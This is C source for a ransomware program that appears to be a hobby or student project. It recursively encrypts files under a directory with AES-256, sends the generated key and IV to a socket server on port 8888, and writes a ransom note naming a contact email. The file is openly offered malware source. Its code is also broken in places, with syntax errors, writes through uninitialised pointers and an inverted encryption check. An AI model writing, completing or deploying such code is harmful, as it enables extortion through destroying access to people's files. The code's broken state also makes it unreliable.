#include "ransomlib.h"
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h> //aloc memory

// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <string.h>

// for isFile()
#include <sys/types.h> //isFile()
#include <errno.h>
//ransomlib.h rewrites for visibility
#define SIZEKEY AES_256_KEY_SIZE
#define SIZEIV AES_BLOCK_SIZE

#define SERVER_IP "127.0.0.1"

void usage();
int is_encrypted(char *filename);
void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);
int isFile(const char* name);
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
int send_key(char *pKey, char *pIv);

void usage(void){
    printf(
            "\nUsage:\n"
            " ./ransom [e|d] <path> <key in hex if decrypt>"
            );
    printf(
            "\nOptions:\n"
            "-e    Encrypt input and store results to output\n"
            "-d    Decrypt input and store results to output\n"
            "-h    Print this message\n"
            );
}

int is_encrypted(char *filename){
    char buffer_filename[strlen(filename)];

    strcpy(buffer_filename, filename);
    char *token = strtok(buffer_filename, ".");

    while(token != NULL){
        if(strcmp(token, "encrypt") == 0){
            return 1;
        }
        token = strtok(NULL, ".");
    }
    return 0;
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){    //to do

    char *newPath;
    newPath = calloc(4096,sizeof(char));
    // https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1046380353&id=1044780608
    // Do a recursive function on the files found & exclude. and ..
    DIR *d = opendir(name);
    struct dirent *dir;
    d = opendir(name);
    if(d)
    {
        while ((dir = readdir(d)) != NULL) {
            char* dirname;
            strcpy(dirname,dir->d_name);

            if( strcmp( dir->d_name, "." ) == 0 || strcmp( dir->d_name, ".." ) == 0 ){
                continue;
            }

            if (dir->d_type == DT_DIR){  //if dir
                strcpy(newPath,name);
                strcat(newPath,"/");
                strcat(newPath,dirname);
                listdir(newPath,iv,key,de_flag); // recursive
            }
            else {  //if not dir
                char *filename;
                strcpy(filename,name);
                strcat(filename,"/");
                strcat(filename,dir->d_name);

                //Encrypt
                if (de_flag == 0){
                    if((is_encrypted(filename) == 0) || strcmp(filename,"ransom.txt")!=0){
                        continue;
                    }
                    else{
                        encrypt(key,iv,filename);
                    }
                }
                //Decrypt
                if (de_flag == 1){
                    if(is_encrypted(filename) == 1){
                        decrypt(key,iv,filename);
                    }
                }
            }
        }
        closedir(d);
    }
}

int isFile(const char* name){
    DIR* directory = opendir(name);

    if(directory != NULL)
    {
        closedir(directory);
        return 0;
    }
    if(errno == ENOTDIR)
    {
        return 1;
    }
    return -1;
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){
    if(RAND_bytes(key, sizeKey) == 0) {
        OPENSSL_cleanse(key,sizeKey);
    }
    if(RAND_bytes(iv, sizeIv) == 0) {
        OPENSSL_cleanse(iv,sizeIv);
    }
    bytes_to_hexa(key, pKey, sizeKey);
    bytes_to_hexa(iv, pIv, sizeIv);

    return 0;
}

int send_key(char *pKey, char *pIv)
{
    //Create Socket
    int sockid;
    int server_port = 8888;
    char *server_ip = SERVER_IP;

    sockid = socket(AF_INET,SOCK_STREAM,0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    //Message
    char *msg = "Key and Iv from the target:\n";

    connect(sockid,(struct sockaddr *)&server_addr,sizeof(server_addr));

    send(sockid, (const char *)msg, strlen(msg),0);
    send(sockid, pKey, BUFSIZE,0);
    send(sockid, pIv, BUFSIZE, 0);

    //Delete Message
    memset(msg, 0, sizeof(char));
    memset(pKey, 0, sizeof(char));
    memset(pIv, 0, sizeof(char));

    close(sockid);

}

int main (int argc, char * argv[])
{
    unsigned char *key, *iv;
    char *pKey, *pIv;

    //Binaire
    key = (unsigned char*)calloc(SIZEKEY+1,sizeof(unsigned char));
    iv = (unsigned char*)calloc(SIZEIV+1,sizeof(unsigned char));
    //Hexa
    pKey = (char*)calloc((SIZEKEY*2)+1,sizeof(unsigned char));
    pIv = (char*)calloc((SIZEIV*2)+1,sizeof(unsigned char));


    //Get Arguments
    if (argc > 1) {
        if (!strcmp(argv[1],"-e") {
            if (argc != 3) {
                printf("Do something more like ./ransom -e <path>\n");
                return 0;
            }
            else {
                generate_key(key, SIZEKEY, iv, SIZEIV, pKey, pIv);
                send_key(pKey, pIV);
                listdir(argv[2],iv,key,0);
            }
        }
        else if (!strcmp(argv[1],"-d")) {
            if (argc != 5) {
                printf("Do something more like ./ransom -d <path> <key> <vector>\n");
                return 0;
            }
            else {
                // size verification
                if (strlen(argv[4]) == SIZEKEY*2){
                    hexa_to_bytes(pKey, key, SIZEKEY);
                }
                else {
                    printf("Wrong key size")
                    return 0;
                }

                if (strlen(argv[5]) == SIZEIV*2){
                    hexa_to_bytes(pIv, iv, SIZEIV);
                }
                else {
                    printf("Wrong iv size")
                    return 0;
                }
                listdir(argv[2],iv,key,1);
            }
        }
    }
    else if (!strcmp(argv[1],"-h") {
        usage();
        return 0
    }
    else {
        printf("Wrong argument");
        return 0
    }
    else {
        printf("Please specify -e or -d to continue\n");
        usage();
        return 0;
    }



        //Ransom Letter - Cannot be written if we encrypt the whole machine (should put a condition not to encrypt ransom.txt after having created it)
        FILE* fichier = NULL;
        int currentchar = 0;
        fichier = fopen("ransom.txt", "w");

        if (fichier != NULL)
        {
            fputs("Your Computer has been intercepted and placed under quarantine\nPlease contact us at the following address to have access to your machine unlocked:\n getpowned@yahoo.fr", fichier);

            fclose(fichier);
        }

        return 0;
    }

}
// to do Gestion des fichiers volumineux avec - st_size  #include <sys/stat.h> & #include <time.h>  https://linux.die.net/man/2/stat

